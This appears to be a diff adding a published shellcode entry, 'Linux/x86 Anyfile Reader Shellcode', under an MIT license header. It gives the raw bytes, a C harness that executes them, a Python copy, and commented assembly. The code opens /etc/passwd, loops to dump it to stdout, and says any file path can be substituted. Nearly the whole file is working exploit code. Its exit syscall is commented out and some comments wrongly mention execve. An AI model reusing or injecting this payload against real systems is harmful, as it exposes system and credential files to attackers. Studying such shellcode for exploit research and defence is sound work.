@@ -1,0 +1,95 @@
+;================================================================================
+; The MIT License
+;
+; Copyright (c) <year> <copyright holders>
+;
+; Permission is hereby granted, free of charge, to any person obtaining a copy
+; of this software and associated documentation files (the "Software"), to deal
+; in the Software without restriction, including without limitation the rights
+; to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+; copies of the Software, and to permit persons to whom the Software is
+; furnished to do so, subject to the following conditions:
+; 
+; The above copyright notice and this permission notice shall be included in
+; all copies or substantial portions of the Software.
+; 
+; THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+; IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+; FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+; AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+; LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+; OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
+; THE SOFTWARE.
+;================================================================================
+;     Name : Linux/x86 - Anyfile Reader Shellcode (54 Bytes)
+;     Author : WangYihang
+;     Email : wangyihanger@gmail.com
+;     Tested on: Linux_x86
+;     Shellcode Length: 54
+;================================================================================
+; Shellcode : 
+; You can complie it to verify by using : gcc -z execstack -o exploit exploit.c
+char shellcode[] = "\x31\xc9\x51\x68\x73\x73\x77\x64"
+                             "\x68\x2f\x2f\x70\x61\x68\x2f\x65"
+                             "\x74\x63\x89\xe3\x31\xc0\x99\xb0"
+                             "\x05\xcd\x80\x89\xc7\xb2\xff\x89"
+                             "\xe1\x89\xfb\xb0\x03\xcd\x80\xb3"
+                             "\x01\xb0\x04\xcd\x80\xfe\xca\x80"
+                             "\xfa\x01\x74\x02\xeb\xe9"
+int main(){
+    void(*exploit)();
+    exploit = &shellcode;
+    exploit();
+}
+;================================================================================
+; Python : 
+;        shellcode = "\x31\xc9\x51\x68\x73\x73\x77\x64"
+;        shellcode += "\x68\x2f\x2f\x70\x61\x68\x2f\x65"
+;        shellcode += "\x74\x63\x89\xe3\x31\xc0\x99\xb0"
+;        shellcode += "\x05\xcd\x80\x89\xc7\xb2\xff\x89"
+;        shellcode += "\xe1\x89\xfb\xb0\x03\xcd\x80\xb3"
+;        shellcode += "\x01\xb0\x04\xcd\x80\xfe\xca\x80"
+;        shellcode += "\xfa\x01\x74\x02\xeb\xe9"
+;================================================================================
+; Assembly language code : 
+global _start
+_start:
+; int open(const char *pathname, int flags);
+xor ecx, ecx ; #DEFINE O_RDONLY 0
+; push \x00 to the stack to end the filename (string)
+push ecx
+; push filename to the stack (You can also change the filename to anyfile you want to read)
+; But your input must in reverse order by 4 bytes.
+; You can use '/' to file the 0 bytes , because execve() will ignore the muti '/' in your filepath
+push "sswd"
+push "//pa"
+push "/etc"
+mov ebx, esp
+xor eax, eax
+cdq
+mov al, 05H
+int 80H
+mov edi, eax ; save the fd
+mov dl, 1+0FEH
+reading:
+; ssize_t read(int fd, void *buf, size_t count);
+;mov dl, 0FFH ; read 0xFF Bytes to the stack
+mov ecx, esp
+mov ebx, edi ; get the fd
+mov al, 03H
+int 80H
+; ssize_t write(int fd, const void *buf, size_t count);
+mov bl,1
+mov al, 04H
+int 80H
+; continue reading ? 
+dec dl
+cmp dl, 1H
+jz exit ; jmp out
+; continue reading!
+jmp reading
+exit:
+; void _exit(int status);
+; mov eax, 1
+; int 80H
+;================================================================================
